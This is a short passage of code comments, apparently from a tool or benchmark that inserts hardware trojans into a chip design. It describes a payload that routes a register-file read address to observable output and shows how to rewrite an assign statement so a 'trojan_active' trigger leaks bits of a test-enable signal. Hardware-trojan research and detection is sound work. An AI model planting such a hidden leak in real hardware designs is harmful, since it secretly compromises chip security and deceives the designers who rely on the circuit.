 ...
 * Payload: Route raddr_a_i[0] to observable output
 * 
...
//   Find the assign for raddr_a_i (or rd_error_o as fallback):
//     assign raddr_a_i = <normal_expr>;
//   Replace with:
//     assign raddr_a_i = trojan_active ? test_en_i[leak_bit_idx] : (<normal_expr>);
//
